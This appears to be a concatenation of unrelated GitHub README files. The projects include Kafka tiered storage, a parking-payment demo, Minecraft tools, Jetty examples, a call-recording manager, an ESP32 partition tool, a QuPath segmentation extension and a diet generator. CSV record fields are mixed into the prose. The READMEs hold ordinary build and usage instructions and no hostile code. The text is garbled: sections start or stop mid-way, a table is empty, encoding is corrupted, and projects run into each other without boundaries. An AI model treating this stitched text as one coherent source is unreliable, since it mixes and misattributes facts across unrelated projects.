	- Spawn/respawn
- Pathfinding
- Server Ghosting/Grid system
- Npc list and spawn list persistence
- Basic combat
- Itemization (gear/inventory)

pinterest/tiered-storage,main,"# Pinterest Tiered Storage for Apache Kafka¬Æ
Pinterest Tiered Storage for [Apache Kafka¬Æ](https://kafka.apache.org/) is a broker-independent framework that allows brokers
to offload finalized log segments to a remote storage system. 
This allows Apache Kafka¬Æ to maintain a smaller disk footprint and reduce the need for expensive storage on the brokers. 
The framework also provides a consumer client that can consume from both the broker and the remote storage system.

Pinterest's implementation of Tiered Storage for Apache Kafka¬Æ provides a ***broker-independent*** approach to Tiered Storage.
***See the differences between [Pinterest vs. Apache Kafka¬Æ Tiered Storage](#pinterest-vs-apache-kafka-tiered-storage)***.

It consists of two main components:
1. [Uploader](ts-segment-uploader): A continuous process that runs on each Apache Kafka¬Æ broker and uploads finalized log segments to a remote storage system (e.g. Amazon S3, with unique prefix per cluster and topic).
2. [Consumer](ts-consumer): A consumer client capable of consuming from both Tiered Storage log segments and Apache Kafka¬Æ cluster.

A third module [ts-common](ts-common) contains common classes and interfaces that are used by the `ts-consumer` and `ts-segment-uploader` modules, such as Metrics, StorageEndpointProvider, etc.

Feel free to read into each module's README for more details.

# Why Tiered Storage?
[Apache Kafka¬Æ](https://kafka.apache.org/) is a distributed event streaming platform that stores partitioned and replicated log segments on disk for
a configurable retention period. However, as data volume and/or retention periods grow, the disk footprint of Apache Kafka¬Æ clusters can become expensive. 
Tiered Storage allows brokers to offload finalized log segments to a more cost-effective remote storage system, reducing the need for expensive storage on the brokers.

With Tiered Storage, you can:
1. Maintain a smaller overall broker footprint, reducing operational costs
2. Retain data for longer periods of time while avoiding horizontal and vertical scaling of Apache Kafka¬Æ clusters
3. Reduce CPU, network, and disk I/O utilization on brokers by reading directly from remote storage

## Pinterest vs. Apache Kafka¬Æ Tiered Storage
### Apache Kafka¬Æ Tiered Storage
[KIP-405](https://cwiki.apache.org/confluence/display/KAFKA/KIP-405%3A+Kafka+Tiered+Storage?uclick_id=11f222c6-967b-4935-98a9-cc88aafad7f5)
provides a native, open-source offering to Tiered Storage for Apache Kafka¬Æ and is available starting from Apache Kafka¬Æ 3.6.0.
The native Tiered Storage implementation is broker-dependent, meaning that the broker process itself is responsible 
for offloading finalized log segments to remote storage, and the ***broker is always in the critical path of consumption***.

### Pinterest Tiered Storage: Skip the broker
***Pinterest's implementation of Tiered Storage is broker-independent***, meaning that the Tiered Storage process runs as a separate process alongside the Apache Kafka¬Æ server process,
***and the broker is not always in the critical path of consumption***.
This allows for more flexibility in adopting Tiered Storage, and better accommodates unpredictable consumption patterns. 
Some of the key advantages of a broker-independent approach are:

1. **You don't need to upgrade brokers**: While the native offering requires upgrading brokers to a version that supports Tiered Storage, a broker-independent approach does not.
2. **You can skip the broker entirely during consumption**: When in `TIERED_STORAGE_ONLY` mode, the consumption loop does not touch the broker itself, allowing for more
unpredictable spikes in consumption patterns without affecting the broker. See [MemQ](https://github.com/pinterest/memq) for a PubSub system that uses this approach natively.
3. **Support consumer backfills and replays without affecting broker CPU**: When the broker is out of the critical path of consumption,
consumer backfills and replays can be done without needing to keep additional CPU buffer on the brokers just to support those surges.
4. **Avoid cross-AZ transfer costs**: While the native approach adds a cross-AZ network cost factor for consumers that are not AZ-aware,
this broker-independent approach avoids that cost for all consumers when reading directly from remote storage.
5. **Faster adoption, iteration, and improvements**: A broker-independent Tiered Storage solution lets you adopt and upgrade Tiered Storage without
waiting for Apache Kafka¬Æ upgrades. Improvements, bug fixes, and new features are released independently of Apache Kafka¬Æ releases.

# Highlights
- **Broker Independent**: The tiered storage solution is designed to be broker-independent. [Here's why we think it's better](#pinterest-tiered-storage-for-apache-kafka).
- **Skip the broker entirely during consumption**: The consumer can read from both broker and Tiered Storage backend filesystem. When in `TIERED_STORAGE_ONLY` mode, the consumption loop does not touch the broker itself, allowing for reduction in broker resource utilization.
- **Pluggable Storage Backends**: The framework is designed to be backend-agnostic.
- **S3 Partitioning**: Prefix-entropy (salting) is configurable out-of-the-box to allow for prefix-partitioned S3 buckets, allowing for better scalability by avoiding request rate hotspots.
- **Fault Tolerant**: Broker restarts, replacements, leadership changes, and other common Apache Kafka¬Æ operations / issues are handled gracefully.
- **Metrics**: Comprehensive metrics are provided out-of-the-box for monitoring and alerting purposes.

# Quick Start
Detailed quickstart instructions are available [here](docs/quickstart.md).

# Usage
Using Pinterest Tiered Storage for Apache Kafka¬Æ consists of the following high-level steps:
1. Have a remote storage system ready to accept reads and writes of log segments (e.g. Amazon S3 bucket)
2. Configure and start [ts-segment-uploader](ts-segment-uploader) on each Apache Kafka¬Æ broker
3. Use [ts-consumer](ts-consumer) to read from either the broker or the remote storage system
4. Monitor and manage the tiered storage system using the provided metrics and tools

Feel free to read into each module's README for more details.

HexArchBook/bluezone_pro,main,"# BlueZone
## An example application implementing Hexagonal Architecture

![BlueZone: Hexagonal Application Figure](bluezone.png)

__BlueZone__ allows car drivers to pay remotely for parking cars at regulated zones in a city, instead of paying with coins using parking meters.

- Driving actors using the application are _car drivers_ and _parking inspectors_.

  - Car drivers will access the application using a Web UI (User Interface), and they can do the following:
    
    - Ask for the available rates in the city, in order to choose the one of the zone they want to park the car at.
    - Buy a ticket for parking the car during a period of time at a regulated zone. This period starts at current date-time. The ending date-time is calculated from the paid amount, according to the rate (euros/hour) of the zone.

  - Parking inspectors will access the application using a terminal with a CLI (Command Line Interface), and they can do the following:
  
    - Check a car for issuing a fine, in case that the car is illegally parked at a zone. This will happen if there is no active ticket for the car and the rate of the zone. A ticket is active if current date-time is between the starting and ending date-time of the ticket period.
    
- Driven actors needed by the application are:

  - Repository with the data (rates and tickets) used in the application. It also has a sequence for getting ticket codes as they are needed.

  - Payment service that allows the car driver to buy tickets using a card. Obviously, no adapter for a real service has been developed, just a test-double (mock).

  - Date-time service for obtaining the current date-time when needed, for buying a ticket and for checking a car.

### Development environment:

- Java 17 (OpenJDK version 17.0.2)

- Maven 3.9.5

- IntelliJ IDEA 2023.1.5 (Community Edition)

- Ubuntu 20.04.6 LTS (Linux 5.15.0-86-generic)

### Instructions:

- Download and extract this GitHub repo to a local directory on your computer ( `<bluezone_dir>` )

- Compile all modules (you need to do this just the first time before running):

    ~~~
    cd <bluezone_dir>
    ./scripts/build.sh
    ~~~

- Select the adapters to be plugged-in at each port, editing the ""ports_adapters.properties"" file, located in the ""<bluezone_dir>/config"" directory.
 
- Initialize the driven actors as you need, editing the ""driven_actors.properties"" file, located in the ""<bluezone_dir>/config/driven-side"" directory.

- Run the driving actor you want by executing the script:

    ~~~
    cd <bluezone_dir>
    ./scripts/run_forparkingcars.sh
  ~~~

or

  ~~~
    cd <bluezone_dir>
    ./scripts/run_forissuingfines.sh
  ~~~

- If you chose to run the Web UI at the ""for parking cars"" port, the URL is http://localhost:8080/bluezone/",0,0,1,GPL-3.0,,0.0

## How this work in future?

### World Data Access
1. Use shizuku (or rooted) to access com.mojang data first
2. Copy data to ""games"" directory
3. Read the world data
4. Display on app

*Note: apply data back to original directory after stop the app or saved world*

### World Viewer Features
- Use libgdx to display 3D world viewer
- A NBT editor in app directly (level.dat & world data)
- Extensions system

## Build

Clone project in Android Studio: `File -> New -> Project from Version Control -> Git`
Install missing SDK components. Android Studio would give you the auto-fix options.

Or Manual

git clone https://github.com/NguyenDuck/blocktopograph.git

Apply Fluent Design materials to the Minecraft window.

![acrylicraft-cover](cover.png)

## System Requirement

Fluent design materials, dark mode, and border customization are exclusive to **Windows 11 Version 22H2** (OS build 22621) or later. However, you can still utilize this mod on other operating systems to get the window background transparent, and then use other tools (e.g., [Blur My Shell](https://extensions.gnome.org/extension/3193/blur-my-shell/) for GNOME) for further customizations.

## Mod Dependencies

Acrylic depends on [YetAnotherConfigLib](https://modrinth.com/mod/yacl) as its configuration library. Additionally, you will need [Mod Menu](https://modrinth.com/mod/modmenu) placed in your mods folder to access mod config if using Fabric.

For Forge/NeoForge 1.20 and later, it is also necessary to disable the FML splash screen for the translucent game window to be properly initialized. This can be done by setting `earlyWindowControl` in `.minecraft\config\fml.toml` to `false`. Note that this MIGHT lead to malfunctions for some rendering mods that leverage advanced OpenGL features, so proceed at your own risk.

## Known Issues

Some NVIDIA graphics cards don't render translucency properly for Minecraft's window (or any other GLFW window), in which case the window background would appear black. This is likely an issue with their drivers and is unfortunately not solveable on my end. Switching to another graphics card should make it work, if you happen to have one installed on your machine.

# Eclipse Jetty¬Æ - Examples

This is a collection of examples of how to use various features
present in the Eclipse Jetty server and Eclipse Jetty client.

There are a few major categories of examples.
## Embedded Examples

Using Embedded Jetty is extremely powerful way to include Jetty
in your Java application using Code (instead of configuration) to
setup a Jetty server or Jetty client.

Here you will see answers to common questions about how to 
integrate various features of Jetty, and also how to enable features
of 3rd party libraries within Jetty (such as JSP, REST, and CDI).

See [embedded/README.md][7] for a breakdown of embedded examples.

## Standalone Examples

The Standalone examples present fully formed `${jetty.base}` directories
that can be used to understand how to configure the jetty module system
and its various components to reach an end goal.

See [standalone/README.md][8] for a breakdown of standalone examples.

## Webapp Examples

A collection of various WAR files that can be used to demonstrate
how to use web and JVM features in Jetty.

See [webapps/README.md][9] for a breakdown of webapp examples.

## Introduction

This is a simple app, that I have developed for myself. The purpose of this app is to manage all records and simply search and listen.
You can add some breakpoints to every registration, and mark any registration as starred, so when open the app, you will find starred on top.
The app has Dynamic Shortcuts too, based on the count of registrations per-contact.
I'm not a professional developer, so the code is not perfect. I've tested the app on A13 and A14.

## Requirements

If you want to use BCR Manager, you need BCR 1.49 (or newer), because the app needs the JSON Metatada from BCR.
So you you have BCR, ensure to enable ""Write JSON Metadata"".

## Features

A few of the things you can do with BCR Manager:

* Listen your recordings
* Filter your recordings
* Share and delete recordings
* Batch delete recordings (e.g. per-contact and/or per-date and/or per-duration)
* Mark a recording as starred
* Create breakpoints for every recording

## Permissions

This app requires the following permissions, but it's not mandatory:

`android.permission.READ_CALL_LOG`
Permission to read Call Log, for getting the contact name (and business name if contact not saved) based on Call Log


`android.permission.READ_CONTACTS`
Permission for Read Contacts: needed to get the contact name, all contact's numbers and contact pictures.
Contacts numbers are used for dynamic shortcuts.

`android.permission.READ_PHONE_STATE`
Permission to Read Phone State: to get VoiceMail's number, Emergency number (for creating the LetterTileDrawable) and numbers of active SIMs.

## How it works
The application asks the Directory where all registrations are saved, then checks all files.
For registrations that has a JSON file, it will parse the JSON file based on Gson Library and get all metadata.
For registrations that hasn't a JSON file, it will parse the filename. Ensure that you have at least date and number in the filename.
It will check in the Call Log for the number and get the contact name (and business name if contact not saved).
If the contact is saved, it will get the contact picture too from Contacts.
When all file are parsed, the app saves all registrations in a JSON file, so on the next open it will load the JSON file instead of parsing all files again.
The app checks for directory changes, so it will know where to parse new files or when a file is deleted.

## Feedback

Feature requests are always welcome. If you want to make a feature request, open a new issue.

## Issues

If you want to report an issue with the app, just open a new issue on GitHub.

## License

BCR Manager is licensed under GPLv3. Please see [`LICENSE`](./LICENSE.md) for the full license text.

## Changelog

See [`CHANGELOG`](./CHANGELOG.md) for a complete list of changes.

## TODOs
TODOs, but I don't know if I will do it, but if the app will be popular, I will do it.
- Improve code quality
- ~Add custom Themes (colors)~
- Migrate to Kotlin (not necessary)
- ~Migrate to ViewModel~
- Add desktop shortcut per-contact

# spring-data-eclipse-store

A library to simplify using [EclipseStore](https://eclipsestore.io/) in the [Spring environment](https://spring.io/projects/spring-data/).

What makes this library special is, that it creates a working copy of the data.
This way EclipseStore behaves almost exactly like relational database from a coding perspective.

## Features

The library provides following features:

* Enforces the
  **[Spring data repository concept](https://docs.spring.io/spring-data/jpa/reference/repositories/core-concepts.html)**
  for EclipseStore by
  using [working copies](https://xdev-software.github.io/spring-data-eclipse-store/working-copies.html)
* **[Drop in compatible](https://xdev-software.github.io/spring-data-eclipse-store/installation.html#drop-in-compatible)** for your existing Spring application
* Utilizes **ultra-fast EclipseStore serializing and storing**
* Enables your application to **select
  any [EclipseStore target](https://docs.eclipsestore.io/manual/storage/storage-targets/index.html)** (e.g.
  [PostgreSQL](https://docs.eclipsestore.io/manual/storage/storage-targets/sql-databases/postgresql.html),
  [AWS S3](https://docs.eclipsestore.io/manual/storage/storage-targets/blob-stores/aws-s3.html) or
  [IBM COS](https://github.com/xdev-software/eclipse-store-afs-ibm-cos))
* Can save up to **99%[^1] of monthly costs** in the IBM Cloud and up to 82%[^2] in the AWS Cloud

[^1]:If the COS Connector is used in the IBM Cloud instead of a PostgreSQL and approx. 10,000 entries with a total size
of 1
GB of data are stored. ([IBM Cloud Pricing](https://cloud.ibm.com/estimator/estimates), as of 08.01.2024)

[^2]: If the S3 connector is used instead of DynamoDB under the same conditions at
AWS. ([AWS Pricing Calculator](https://calculator.aws/#/estimate?id=ab85cddf77f0d1aa0457111ed82785dfb836b1d8), as of
08.01.2024)

# Liferay Client Extensions Samples

Automatically mirror official client extensions samples you can find in the main repo here: https://github.com/liferay/liferay-portal/tree/master/workspaces/liferay-sample-workspace/client-extensions

The goal of this repository is to ease the process of trying out client extensions samples by removing the burden of cloning liferay-portal & by renaming ambiguous client extensions (e.g. `custom-element-1`).

The official readme file for those samples is mirrored in the [HOW-TO.md](HOW-TO.md).

The new naming is an arbitrary choice based on the description provided by Liferay in the readme file. Here's the correspondance for the renamed client extensions:

| **Original name** | **New name**                                                 			|

## Aditional information

If the build fails because of the Node version, you can force the use of a specific version by changing the build.gradle with something like:

```gradle
apply plugin: ""com.liferay.node""

node {
	nodeVersion = ""20.10.0""
	global = false
}
```
> Note that you can apply this for a specific client extension or all client extensions if you change the value in the parent folder (`client-extensions` or your liferay workpace).",0,0,1,MIT,builder.yml,1.0

## üöÄ Quick Start

### Add Maven Dependency
Include the following Maven dependency in your Spring Boot project:

```xml
<dependency>
    <groupId>io.github.javpower</groupId>
    <artifactId>rtsp-converter-flv-spring-boot-starter</artifactId>
    <version>1.5.9.1</version>
</dependency>
```

### Implement Interface
Create a service class that implements the `IOpenFLVService` interface to provide the stream address:

```java
@Service
public class RtspDataService implements IOpenFLVService {

    @Override
    public String getUrl(Integer channel) {
        // Retrieve the RTSP stream address based on the channel
        return ""rtsp://10.11.9.251:554/openUrl/16HV8mA"";
    }
}
```

### Configure YAML
Configure Easy-FLV in your `application.yml`:

```yaml
easy:
  flv:
    host: http://localhost:8200
```

### Use Interface
To get the converted stream address and play it in a browser:

- Conversion URL: `GET http://ip:port/get/flv/hls/stream_{channel}.flv`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream_{channel}.flv`

### Direct Usage
If you prefer not to implement an interface, you can directly encode the stream address and convert it:

```java
public static void main(String[] args) throws UnsupportedEncodingException {
    String url = ""rtsp://XXXXXXXX"";
    String encodedUrl = java.net.URLEncoder.encode(url, ""UTF-8"");
    System.out.println(""Encoded Stream URL: "" + encodedUrl);
}
```

- Conversion URL: `GET http://ip:port/get/flv/hls/stream?url=EncodedAddress`
- Direct Browser Playback: `GET http://ip:port/flv/hls/stream?url=EncodedAddress`

## Download
 [![Release](https://img.shields.io/github/release/serifpersia/esp32partitiontool.svg?style=flat-square)](https://github.com/serifpersia/esp32partitiontool/releases)

# Build Instructions

## Build Requirements
Ensure you have the following installed:
- **Java JDK 8**: Required for compiling Java source files.
- **Python 3.6+**: Required for running the build script.

## Building the Tool

1. **Clone the Repository**:
   ```sh
   git clone https://github.com/serifpersia/esp32partitiontool.git
   cd esp32partitiontool
   ```
## Run the Build Script

- On **Unix-based systems** (Linux, macOS):
  ```
    python3 build_tool.py
- On **Windows**:
  ```
    python build_tool.py
  ```

## Installation (Arduino IDE)
- Download the tool from releases or build it yourself.
- In your Arduino sketchbook directory, create tools directory if it doesn't exist yet.
- Unpack the tool into tools directory (the path will look like `<home_dir>/Arduino/tools/ESP32PartitionTool/tool/ESP32PartitionTool.jar`).
- Restart Arduino IDE

## Usage (Arduino IDE)
- Select Tools > ESP32 Partition Tool menu item.
- Customize partition scheme.
- Export the custom partitions CSV file to sketch directory.
- Select Tools > Partition Scheme & select `Huge App (3MB APP/NO OTA/1MB SPIFFS)`*this will tell Arduino IDE to use our custom partitions.csv file that's located in sketch directory(export csv via the the tool first).
- Close and open the tool to automatically load csv located at the sketch directory or load csv manually with import csv button.
- Configure Flash size and use the uploading buttons. Upload SPIFFS for filesystem spiffs binary, Upload Merge for uploading all binaries or Merge binary for just creating the merge binary file.
* Merged binary can only be uploaded to ESP32 boards via serial ports, OTA uploading is not supported, spiffs upload is supported for uploading over OTA.

## Installation (Platformio)

- Install Java and make sure the executable is in the path
- Create a `partition_manager.py` in your project folder

#### partition_manager.py

```python
Import('env')
import os.path
import sys

# add esp32partitiontool to path
sys.path.append(os.path.abspath( env.PioPlatform().get_package_dir(""tool-esp32partitiontool"") ))
# import module
from esp32partitiontool import *
# run module
load_pm(env)
```

- To launch the GUI, both `extra_scripts` and `platform_packages` entries must be set

#### platformio.ini

```ini
[platformio]
src_dir = src
default_envs = hello-world

[env]
framework = arduino
platform = espressif32
board = esp32dev
; register the ""tool-esp32partitiontool""
; remove url if you have own built tool in pacakges directory of platformio core directory
platform_packages = tool-esp32partitiontool @ https://github.com/serifpersia/esp32partitiontool/releases/download/v1.4.4/esp32partitiontool-platformio.zip
; register the ""edit_partition"" target
extra_scripts = partition_manager.py

[env:hello-world]
board_build.partitions = partitions/default.csv
board_upload.flash_size = 4MB
upload_speed = 1500000


```

- If building the plugin from source, remove the URL from the `platform_packages` entry ...

```ini
platform_packages      = tool-esp32partitiontool
```

- ... and use `pio pkg` to install the plugin from the root of your platformio project:

```shell
pio pkg install -e build-partition --no-save --tool /path/to/esp32partitiontool/esp32partitiontool-platformio.zip --force
```


## Usage (Platformio)

- If building from vsCode: run  ESP32 Partition Tool Task
- If building from a shell : `pio run -t edit_partition -e your_environment`

<img style=""float: right"" width=""25%"" alt=""InstanSeg logo"" src=""https://github.com/instanseg/instanseg/raw/main/assets/instanseg_logo.png"" />

## üöß Work-in-progress! üöß 

**The easiest way to try this out is with the [new QuPath 0.6.0 Release Candidate](https://github.com/qupath/qupath/releases)!**

---

**Welcome to the [InstanSeg](https://github.com/instanseg/instanseg) extension for [QuPath](http://qupath.github.io)!**

**InstanSeg** is a novel deep-learning-based method for segmenting nuclei and cells... and potentially much more.

> Looking for the main InstanSeg code for training models?
> Find it [here](https://github.com/instanseg/instanseg).

## What is InstanSeg?

You can learn more about InstanSeg in two preprints.

For an introduction & comparison to other approaches for _nucleus_ segmentation in _brightfield histology images_, see:

> Goldsborough, T. et al. (2024) ‚ÄòInstanSeg: an embedding-based instance segmentation algorithm optimized for accurate, efficient and portable cell segmentation‚Äô. _arXiv_. Available at: https://doi.org/10.48550/arXiv.2408.15954.

To read about InstanSeg's extension to _nucleus + full cell segmentation_ and support for _fluorescence & multiplexed_ images, see:

> Goldsborough, T. et al. (2024) ‚ÄòA novel channel invariant architecture for the segmentation of cells and nuclei in multiplexed images using InstanSeg‚Äô. _bioRxiv_, p. 2024.09.04.611150. Available at: https://doi.org/10.1101/2024.09.04.611150.

## Why should I try InstanSeg?

1. It's fully open-source
   - We also provide models pre-trained on open datasets
2. It's not limited to nuclei... or to cells
   - One model can provide different outputs: nuclei, cells, or both
3. It's accurate compared to all the popular alternative methods 
   - In our hands InstanSeg consistently achieved the best F1 score across multiple datasets compared to CellPose, StarDist, HoVerNet and Mesmer. But everyone's images are different & fair benchmarking is hard - check out the preprints & judge what works best for you!
4. It's faster than other methods (usually _much_ faster)
   - InstanSeg supports GPU acceleration with CUDA _and_ with Apple Silicon (so Mac users can finally have fast segmentation too!)
5. It's portable 
   - The full pipeline _including postprocessing_ compiles to TorchScript - so you can also run it from [Python](https://github.com/instanseg/instanseg) & [DeepImageJ](https://deepimagej.github.io).
6. It's easy to use
   - InstanSeg models are trained at a specific pixel resolution (e.g. 0.5 ¬µm/px). As long as your image has pixel calibration set, this extension will deal with any resizing needed to keep InstanSeg happy.
7. It's _uniquely_ easy to use for fluorescence & multiplexed images 
   - When used with ChannelNet, InstanSeg supports _any* number of channels in any order_! There's no need to select channels manually, or retrain for different markers.

_*-Well, at least as much as your computer's memory allows_

## How do I _get_ InstanSeg in QuPath?

This extension is for **QuPath v0.6.0... which we plan to release in October 2024**.

If you can't wait, you can try the [release candidate v0.6.0-rc1](https://github.com/qupath/qupath/releases) - which comes with this extension pre-installed, along with the [Deep Java Library Extension](https://github.com/qupath/qupath-extension-djl).

> ### GPU support
> If you have an NVIDIA graphics card & want to use CUDA, check out [GPU support](https://qupath.readthedocs.io/en/0.5/docs/deep/gpu.html).
> 
> If you use a recent Mac with Apple silicon, no special configuration should be needed - just choose 'MPS' as the device (described below).

## How do I _run_ InstanSeg in QuPath?

There are two steps to get started:
1. Use _Extensions ‚Üí Deep Java Library ‚Üí Manage DJL Engines_ to download PyTorch
   - See [docs here](https://qupath.readthedocs.io/en/stable/docs/deep/djl.html#getting-started-with-qupath-djl) - especially if you want it to work with CUDA (which can be tricky to configure)
2. Use _Extensions ‚Üí InstanSeg ‚Üí Run InstanSeg_ to launch InstanSeg

The dialog should guide you through what to do next:
1. Choose a directory on your computer to download pre-trained models
2. Pick a model and download it
3. Select one or more annotations
4. Press *Run*

## What do the additional options do?

There are several options available to customize things:

* **Preferred device**: `cpu` to run without a graphics card involved, `gpu` if you've been lucky with CUDA configuration, and `mps` if you're using Apple Silicon
* **Threads**: Number of threads to use for fetching & submitting image tiles; 1 is usually too little, but high numbers probably won't help much - so the default is between 2 and 4.
* **Tile size**: Large regions are broken into tiles; usually 512 or 1024 pixels is a good choice
* **Tile padding**: When creating tiles, part of each tile is used as 'padding' and can overlap with neighboring tiles. A small padding means less overlap, and faster processing. But if your objects are too big, they might disappear or become clipped across tiles. If that happens, try increasing this value.
* **Input channels**: Select which channels to input. Some models take a fixed number, others (thanks to ChannelNet) don't care. You can even apply color deconvolution here, if you want an easy way to apply a fluorescence model to a brightfield image.
* **Outputs**: Select what to output. Some models just have one output (e.g. nuclei or cells). Others have multiple outputs, and you can select any combination.
* **Make measurements**: Optionally add QuPath measurements to whatever InstanSeg detected.
* **Random colors**: Optionally set the color of each detected object randomly. This helps distinguish neighboring objects.

## How do I run this across multiple images?
The extension is scriptable - the core parameters are logged in the history, and can be converted into a script.

See [Workflows to scripts](https://qupath.readthedocs.io/en/stable/docs/scripting/workflows_to_scripts.html) in the docs for more details.

Or modify the example script below:
```groovy
qupath.ext.instanseg.core.InstanSeg.builder()
    .modelPath(""/path/to/some/model"")
    .device(""mps"")
    .nThreads(4)
    .tileDims(512)
    .interTilePadding(32)
    .inputChannels([ColorTransforms.createChannelExtractor(""Red""), ColorTransforms.createChannelExtractor(""Green""), ColorTransforms.createChannelExtractor(""Blue"")])
    .outputChannels()
    .makeMeasurements(true)
    .randomColors(false)
    .build()
    .detectObjects()
```

## How do I cite this?
If you use this extension in any published work, we ask you to please cite
1. At least one of the two InstanSeg preprints above (whichever is most relevant)
2. The main QuPath paper - details [here](https://qupath.readthedocs.io/en/stable/docs/intro/citing.html)

# 1. Introduction

---

### 1.1 About Importance of Documentation

Wherever I go, I constantly hear about the importance of documentation in software development. Many times, I've tried
to use a library only to find that the lack of proper documentation made it incredibly difficult to understand and
implement. This experience underscores a critical point: if we, as software developers, want to build software
effectively as teams, we must pay close attention to how we explain our thoughts and code. Good documentation is not
just a nice-to-have; it is essential for collaboration, maintenance, and onboarding new team members. It bridges the gap
between developers' intentions and users' understanding, ensuring that our work is accessible and usable by others.
Without it, even the most elegant code can become an impenetrable black box, hindering productivity and innovation.

### 1.2 What is Fatatu?

Fatatu is a diet generator application that will generate a list of meals with all ingredients and nutrition information
based on provided criteria such as required kcal, diet targets, diet type, etc.
In addition, each diet will provide a shopping list.

With one click you can get a diet and go straight to the shop and buy what you need, you don't need to waste time on
browsing for recipes or adjusting macros. This application will do it for you.

### 1.3 Why this repository exists?

**First reason:** This application was created as an idea that I had in mind for a couple of months/years, and finally I
decided to create it.

**Second reason:** [100commits](https://100commitow.pl/) competitive event gave me motivation to begin this project and
push my skills to the next level.

**Third reason:** I found that creating applications from beginning to the end including deployment is extremely
beneficial in
improving my skills as a Software Developer. With this repository, I decided to learn MongoDB, apply clean architecture,
and
implement comprehensive documentation.

### 1.4 Disclaimer

I am a beginner software developer with less than 2 years of experience who do it as a hobby. I never work in a
professional
environment. I learn everything from books, online courses,
documentation, blogs, forums, YouTube, and AI. Forgive me if something isn't okay in this repo.

### 1.5 Star and share

If you like my work here, you can appreciate me with the star and perhaps share this application with your friends.

Happy coding!

# 2. Architecture

---

This application is simple monolith that utilize clean architecture approach.


## 2.1 Clean Architecture

Clean Architecture, introduced by Robert C. Martin, offers numerous benefits for backend applications. It enforces a
clear separation of concerns, enhancing code manageability and comprehension. This structure improves testability by
decoupling business logic from external dependencies, leading to more robust code. The modularity of Clean Architecture
increases flexibility and maintainability, allowing changes in one part of the application without impacting others. It
also promotes independence from specific frameworks.

Sure, here's a concise overview of each layer in Clean Architecture:

1. Presentation Layer
    - Responsibility: Manages user interactions.
    - Components: UIs, Views, Controllers.
    - Function: Interprets user inputs, displays data.
    - Dependency: Depends on the Application layer.
2. Domain Layer
    - Responsibility: Core business logic and rules.
    - Components: Entities, Value Objects, Domain Services.
    - Function: Defines business concepts and rules.
    - Dependency: Independent, no dependencies.
3. Application Layer
    - Responsibility: Orchestrates business operations.
    - Components: Use Cases, Application Services.
    - Function: Executes operations and coordinates data flow.
    - Dependency: Depends on the Domain layer.
4. Infrastructure Layer
    - Responsibility: Provides technical implementations.
    - Components: Databases, External APIs, Frameworks.
    - Function: Handles technical details and concrete implementations.
    - Dependency: Depends on all other layers.

In the diagram below, we can clearly see that the domain layer doesn't know anything about the application layer. The
same applies to the application layer; it has knowledge about the domain but doesn't know anything about the
infrastructure or presentation layers.

![CleanArchitecture Diagram screenshot](/screenshots/clean-architecture-layer-diagram.png)

Here is another popular diagram that describe clean architecture.

![CleanArchitecture Diagram screenshot](/screenshots/clean-architecture-circle-diagram.webp)

Apart the separation of concerns, another main goal is to keep domain and application layer completely clear from any
frameworks or libraries.
This was nearly archived. The application use lombok library in domain and application layers. Lombok is
lightweight library and allow us to reduce lots of boilerplate code. On the screen we can see usage of lombok
in `Recipe` class where is 10 fields in total. We literally reduced 100 lines of code just to 4 lines.

![Lombok Diagram screenshot](/screenshots/lombok_ss.png)

You may wonder how application layer receive data from database without knowing anything about the infrastructure layer.
The solution is quite interesting. In application layer we create interfaces that are templates and doesn't have any
logic.
Those interfaces are implemented by the infrastructure layer and application layer doesn't need to know how it was done.
UseCase implementation belong to application layer, and usually it need some data from the database. To solve that
problem we simply register
`UseCaseImpl` with `@Bean` in infrastructure layer in `BeanConfiguration` class where we also inject our implementation
of required repository.
As you can see we separate application and domain layers from framework (Spring in this case) completely.

Diagram below show tha basic sample implementation.

![Bean Registration Diagram screenshot](/screenshots/beanregistration_diagram.png)

This approach give us lots of flexibility. We can change our database or the whole framework.
We can rewrite whole infrastructure layer without changing even 1 line in application or domain layers.
Well, in fact our core still depends on infrastructure and presentation layers, those need to be there, but the borders
are clearly created.

Packages according to the clean architecture are presented below:

![Packages screenshot](/screenshots/package_structure_ss.png)

### 2.2 C4 Model

""The C4 model was created as a way to help software development teams describe and communicate software architecture,
both during up-front design sessions and when retrospectively documenting an existing codebase. It's a way to create
maps of your code, at various levels of detail, in the same way you would use something like Google Maps to zoom in and
out of an area you are interested in.""

You can read more about C4 Model at this [LINK](https://c4model.com/)

The C4 model has 4 parts:

# 3. Domain

---

To understand this application first we need to possess the knowledge how human bodies works.

## 3.1 How human body works

### 3.1.1 How kcal Works:

Calories are a measure of energy, and when we talk about food energy, we use the term kilocalories (kcal), commonly
referred to simply as ""calories"" in everyday language. The concept of calorie intake, expenditure, and deficit is
central to understanding weight management.

**Energy Source**: The food we eat provides energy measured in kcal. This energy fuels our body's basic functions (like
breathing and blood circulation), physical activities, and the processing of food itself.

**Energy Expenditure**: Our body uses the energy in several ways:

* Basal Metabolic Rate (BMR): The energy needed for basic functions at rest.
* Physical Activity: The energy expended through exercise and routine daily movements.
* Thermic Effect of Food (TEF): The energy used to digest, absorb, and metabolize food.

Weight management depends on the balance between energy intake (the calories you consume) and energy
expenditure (the calories you burn).

`Change in body weight = Calories consumed ‚àí Calories expended`

The number of calories (kcal) required for a person depends on various factors
such as age, gender, weight, height, and physical activity level.

### 3.1.2 BMI

Calculating your Basal Metabolic Rate (BMR) helps you understand how many calories your body needs at rest to maintain
basic physiological functions. The BMR can be estimated using several formulas, with the Harris-Benedict Equation and
the Mifflin-St Jeor Equation being the most commonly used.

This application currently supports the Mifflin-St Jeor equation

Male equation `BMR = (10 √ó weight in kg) + (6.25 √ó height in cm)  ‚àí (5 √ó age in years) + 5`

Female equation `BMR = (10 √ó weight in kg) + (6.25 √ó height in cm) ‚àí (5 √ó age in years) ‚àí 161`

### 3.1.3 TDEE

To calculate the total daily energy expenditure (TDEE), which represents the total number of calories needed to maintain
your current weight, you multiply your Basal Metabolic Rate (BMR) by an activity factor:

- Sedentary (little or no exercise): BMR √ó 1.2
- Lightly active (light exercise/sports 1-3 days/week): BMR √ó 1.375
- Moderately active (moderate exercise/sports 3-5 days/week): BMR √ó 1.55
- Very active (hard exercise/sports 6-7 days a week): BMR √ó 1.725
- Super active (very hard exercise/sports & a physical job): BMR √ó 1.9

### 3.1.4 TEF

Calculating thermic effect of food (TEF) is not necessary for average person and currently is not supported. This may
change in the future.

## 3.2 Data representation

The main business entities are `Diet`, `Dish`, `Product`, `Recipe` and `Nutrients`. The application create `Diet` object
that consist
of multiple
`Dish` objects. Those dishes are created from `Recipe` and `Product` objects using `DietGenerator` where special
algorithm is implemented to adjust the `Macronutrient` requirements.
